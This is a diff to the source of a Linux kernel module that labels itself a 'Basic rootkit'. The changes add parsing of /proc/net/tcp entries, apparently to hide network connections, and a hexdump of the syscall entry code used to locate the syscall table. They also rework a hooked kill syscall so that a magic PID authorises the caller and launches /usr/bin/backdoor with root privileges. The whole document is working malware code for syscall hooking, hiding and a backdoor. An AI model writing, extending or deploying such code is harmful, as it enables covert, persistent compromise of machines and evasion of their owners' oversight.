@@ -16,7 +16,6 @@ MODULE_AUTHOR("Antoine Rouquette");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Basic rootkit");
 
-#define SYS_CALL_TABLE_ADDR 0xffffffffa5200220
 #define FILE_PATH           "/tmp/hack"
 #define FILE_PATH_SIZE      9
 #define FILE_BASENAME       "hack"
@@ -88,6 +87,7 @@ void *memmem(const void *haystack, size_t haystack_size, const void *needle, siz
 
 unsigned long *find_sys_call_table(void)
 {
+	int i = 0;
 	unsigned long sct_off = 0;
 	unsigned char code[512];
 	char **p;
@@ -97,6 +97,13 @@ unsigned long *find_sys_call_table(void)
 
 	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
 
+	printk("Start Hexdump for MSR_LSTAR\n");
+	for(i = 0; i < 512; i++)
+	{
+		printk("%.2x", code[i]);
+	}
+	printk("End Hexdump for MSR_LSTAR\n");
+	
 	if(p) {
 		unsigned long *table = *(unsigned long **)((char *)p + 3);
 		table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
@@ -195,6 +202,60 @@ static int create_hack_file(void)
 	return 0;
 }
 
+// Extract line from a buffer
+static char * extract_line(void * buf, char * line)
+{
+	char * 	tok = NULL;
+	char * 	p = (char *)buf;
+	size_t	len = 0;
+
+	if(!buf)
+		return NULL;
+
+	tok = strsep(&p, "\n");
+	len = strlen(tok);
+
+	if(!tok || !len)
+		return NULL;
+
+	if(len > MAX_LINE_LEN)
+		return NULL;
+
+	memcpy(line, tok, len);
+	memcpy(line + len, "\0", 1);
+
+	return p;
+}
+
+// Extract local addr from /proc/net/tcp file
+static int extract_local_addr(char * line, char * addr, int is_ipv6)
+{
+	int		addr_size 			= 8;
+	int 	port_size 			= 4;
+	char * 	p   	  			= NULL;
+	char * 	tok 	  			= NULL;
+	char 	buf[MAX_LINE_LEN] 	= {0};
+
+	if(!line || !addr)
+		return -1;
+	else if(strlen(line) < 3)
+		return -1;
+
+	if(is_ipv6)
+		addr_size = 32;
+
+	snprintf(buf, MAX_LINE_LEN, "%s", line);
+	p = buf;
+
+	tok = strsep(&p, ":");
+	if(!p)
+		return -1;
+
+	memcpy(addr, p + 1, addr_size + port_size + 1);
+	memcpy(addr + addr_size + port_size + 1, "\0", 1);
+
+	return 0;
+}
 
 struct file *file_open(const char *path, int flags, int rights)
 {
@@ -337,19 +398,22 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 asmlinkage int fake_sys_kill(pid_t pid, int sig)
 {
 	int 			ret		= 0;
-	pid_t 			child;
-	char * const 	argv[] 	= {"./backdoor"};
+	//~ pid_t 			child;
+	const char * 	filename = "/usr/bin/backdoor";
+	char * argv[] 	= {filename, NULL};
+	char * envp[] 	= { NULL };
 
 	switch(pid)
 	{
 		case MAGIC_AUTH_PID:
-			printk("[%s] Received auth key...", __this_module.name);
+			printk("[%s] Received auth key...\n", __this_module.name);
 			if(authorized_pids_cnt < MAX_PIDS)
 				authorized_pids[authorized_pids_cnt++] = current->pid;
 
-			printk("[%s] Start process backdoor", __this_module.name);
-			ret = original_sys_execve("./backdoor", argv, NULL);
-			printk("[%s] Finish process backdoor", __this_module.name);
+			printk("[%s] Start process backdoor\n", __this_module.name);
+			ret = call_usermodehelper(filename, argv, envp, UMH_WAIT_EXEC);
+			//~ ret = original_sys_execve(filename, argv, envp);
+			printk("[%s] Finish process backdoor %d\n", __this_module.name, ret);
 
 		break;
 		default:
@@ -444,8 +508,7 @@ static int __init lkm_init(void)
 		sys_call = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 		if(!sys_call)
 		{
-			sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;
-			printk("[%s] hardcoded sys_call_table : 0x%p.\n", __this_module.name, sys_call);
+			printk("[%s] module not loaded, could not find syscall table\n", __this_module.name);
 		}
 		else
 		{
